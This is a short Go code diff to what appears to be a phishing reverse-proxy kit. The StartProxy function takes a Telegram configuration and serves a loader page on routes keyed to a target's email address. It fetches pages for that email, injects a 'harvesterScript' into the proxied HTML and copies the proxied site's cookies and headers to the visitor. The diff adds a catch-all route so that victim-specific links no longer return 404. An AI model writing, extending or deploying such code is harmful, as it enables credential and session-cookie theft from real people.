@@ -80,11 +80,17 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.File("./loader.html")
 	})
 
+	// Serve loader directly on root
 	r.GET("/", func(c *gin.Context) {
-		c.File("./loader.html") // Serve loader directly on root
+		c.File("./loader.html")
 	})
 
-	// NEW API ROUTE: Fetches the page without changing the URL
+	// Restored: Prevent 404 when navigating to /testuser@gmail.com
+	r.GET("/:hash", func(c *gin.Context) {
+		c.File("./loader.html")
+	})
+
+	// API ROUTE: Fetches the page without changing the URL
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
 		if email == "" {
@@ -134,7 +140,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)
 		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
 
-		// Clone Cookies and Headers
 		CloneHeaders(resp, c.Writer)
 		for _, cookie := range resp.Cookies() {
 			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
